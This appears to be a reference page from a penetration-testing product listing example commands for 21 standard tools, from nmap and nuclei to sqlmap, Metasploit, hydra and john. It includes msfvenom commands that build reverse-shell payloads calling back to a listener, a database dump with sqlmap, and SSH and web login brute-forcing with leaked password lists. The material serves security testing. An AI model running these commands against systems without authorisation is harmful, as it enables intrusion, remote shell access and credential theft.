---
title: Security Tools Reference
description: Complete reference for OpenClaw Security's 21 pentesting tools
---

# Security Tools Reference

OpenClaw Security includes 21 industry-standard security tools organized by category.

## Reconnaissance

### nmap

Network scanner for port scanning, service detection, and OS fingerprinting.

```bash
# Basic service scan
nmap -sV target.com

# Full scan with scripts
nmap -sV -sC -O -oA nmap_results target.com

# Fast scan top 1000 ports
nmap -F target.com

# Scan specific ports
nmap -p 80,443,8080 target.com

# UDP scan (requires root)
nmap -sU -p 53,161 target.com
```

**Output formats:**
- `-oN file.txt` - Normal output
- `-oX file.xml` - XML output (parseable)
- `-oG file.gnmap` - Grepable output
- `-oA basename` - All formats

### masscan

Ultra-fast port scanner for large IP ranges.

```bash
# Scan all ports
masscan -p1-65535 10.0.0.0/24 --rate=10000

# Scan web ports
masscan -p80,443,8080,8443 10.0.0.0/24 --rate=1000

# Output to file
masscan -p1-65535 target.com -oG masscan.txt
```

**Rate limiting:** Use `--rate 100` for production targets.

### subfinder

Subdomain enumeration tool.

```bash
# Basic subdomain discovery
subfinder -d example.com

# Save to file
subfinder -d example.com -o subdomains.txt

# Use all sources
subfinder -d example.com -all

# Silent mode (only results)
subfinder -d example.com -silent
```

### amass

Comprehensive attack surface mapping.

```bash
# Passive enumeration
amass enum -passive -d example.com

# Active enumeration
amass enum -d example.com

# With brute forcing
amass enum -brute -d example.com

# Output to file
amass enum -d example.com -o amass.txt
```

### whatweb

Website fingerprinting and technology detection.

```bash
# Basic scan
whatweb target.com

# Aggressive mode
whatweb -a 3 target.com

# JSON output
whatweb --log-json=whatweb.json target.com

# Multiple targets
whatweb -i targets.txt
```

---

## Web Application

### nuclei

Template-based vulnerability scanner.

```bash
# Scan with all templates
nuclei -u https://target.com

# CVE templates only
nuclei -u https://target.com -t cves/

# Specific severity
nuclei -u https://target.com -s critical,high

# JSON output
nuclei -u https://target.com -o results.json -json

# Multiple targets
nuclei -l urls.txt -t cves/
```

**Rate limiting:** Use `-rl 10` for production targets.

### nikto

Web server vulnerability scanner.

```bash
# Basic scan
nikto -h https://target.com

# Save to file
nikto -h https://target.com -o nikto.txt

# Specific port
nikto -h target.com -p 8080

# Multiple hosts
nikto -h targets.txt
```

### ffuf

Fast web fuzzer for directories and parameters.

```bash
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w /wordlists/Discovery/Web-Content/common.txt

# Parameter fuzzing
ffuf -u https://target.com/page?FUZZ=test -w /wordlists/Discovery/Web-Content/burp-parameter-names.txt

# POST data fuzzing
ffuf -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -w /wordlists/Passwords/Common-Credentials/10k-most-common.txt

# JSON output
ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json

# Filter by status code
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404
```

**Rate limiting:** Use `-rate 10` for production targets.

### httpx

HTTP probing toolkit.

```bash
# Probe URLs
httpx -u https://target.com

# Technology detection
httpx -u https://target.com -tech-detect

# Multiple targets
cat urls.txt | httpx

# Status codes and titles
httpx -l urls.txt -status-code -title

# JSON output
httpx -l urls.txt -json -o results.json
```

### wpscan

WordPress security scanner.

```bash
# Basic scan
wpscan --url https://wordpress-site.com

# Enumerate users
wpscan --url https://wordpress-site.com -e u

# Enumerate plugins
wpscan --url https://wordpress-site.com -e vp

# Full enumeration
wpscan --url https://wordpress-site.com -e vp,vt,u
```

---

## Vulnerability Assessment

### sqlmap

SQL injection detection and exploitation.

```bash
# Basic test
sqlmap -u "https://target.com/page?id=1"

# Automatic mode
sqlmap -u "https://target.com/page?id=1" --batch

# Dump database
sqlmap -u "https://target.com/page?id=1" --dump

# POST request
sqlmap -u "https://target.com/login" --data "user=admin&pass=test"

# With cookies
sqlmap -u "https://target.com/page?id=1" --cookie "session=abc123"
```

### xsstrike

XSS vulnerability scanner.

```bash
# Basic scan
xsstrike -u "https://target.com/page?q=test"

# Crawl and scan
xsstrike -u "https://target.com" --crawl

# Skip DOM analysis
xsstrike -u "https://target.com/page?q=test" --skip-dom
```

### testssl.sh

SSL/TLS security analyzer.

```bash
# Full test
testssl.sh https://target.com

# Quick test
testssl.sh --fast https://target.com

# Specific checks
testssl.sh --headers https://target.com
testssl.sh --vulnerable https://target.com

# JSON output
testssl.sh --jsonfile results.json https://target.com
```

### searchsploit

Exploit database search.

```bash
# Search by service
searchsploit apache 2.4

# Search by CVE
searchsploit CVE-2021-44228

# Copy exploit to current dir
searchsploit -m 12345

# Examine exploit
searchsploit -x 12345
```

---

## Exploitation

### msfconsole

Metasploit Framework console.

```bash
# Start console
msfconsole

# Search for exploits
msf> search type:exploit platform:linux

# Use an exploit
msf> use exploit/multi/handler
msf> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.1
msf> set LPORT 4444
msf> run
```

### msfvenom

Payload generator.

```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

# Web shell (PHP)
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php

# List payloads
msfvenom -l payloads | grep reverse
```

---

## Credentials

### hydra

Login brute-forcing.

```bash
# HTTP POST login
hydra -l admin -P /wordlists/Passwords/Common-Credentials/10k-most-common.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SSH brute force
hydra -l root -P passwords.txt target.com ssh

# FTP brute force
hydra -L users.txt -P passwords.txt target.com ftp

# Limit threads
hydra -t 4 -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

**Rate limiting:** Use `-t 4` for production targets.

### john

Password hash cracking.

```bash
# Crack with wordlist
john --wordlist=/wordlists/Passwords/Common-Credentials/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt

# Incremental mode
john --incremental hashes.txt
```

---

## Reporting

### gowitness

Web page screenshot tool.

```bash
# Single URL
gowitness single https://target.com

# Multiple URLs from file
gowitness file -f urls.txt

# With custom output
gowitness file -f urls.txt -P screenshots/
```

### jq

JSON processing.

```bash
# Pretty print
cat results.json | jq '.'

# Extract specific field
cat nuclei.json | jq '.info.severity'

# Filter by severity
cat nuclei.json | jq 'select(.info.severity == "critical")'

# Count results
cat results.json | jq '. | length'
```

---

## Wordlists

SecLists is available at `/wordlists`:

| Path | Description |
|------|-------------|
| `/wordlists/Discovery/Web-Content/common.txt` | Common web paths (4,600) |
| `/wordlists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Directory list (220,000) |
| `/wordlists/Discovery/Web-Content/raft-large-files.txt` | Common files (37,000) |
| `/wordlists/Discovery/DNS/subdomains-top1million-5000.txt` | Top 5,000 subdomains |
| `/wordlists/Discovery/DNS/subdomains-top1million-110000.txt` | Top 110,000 subdomains |
| `/wordlists/Passwords/Common-Credentials/10k-most-common.txt` | Common passwords (10,000) |
| `/wordlists/Passwords/Leaked-Databases/rockyou.txt` | RockYou leak (14M) |
| `/wordlists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` | LFI paths |
| `/wordlists/Usernames/top-usernames-shortlist.txt` | Common usernames |
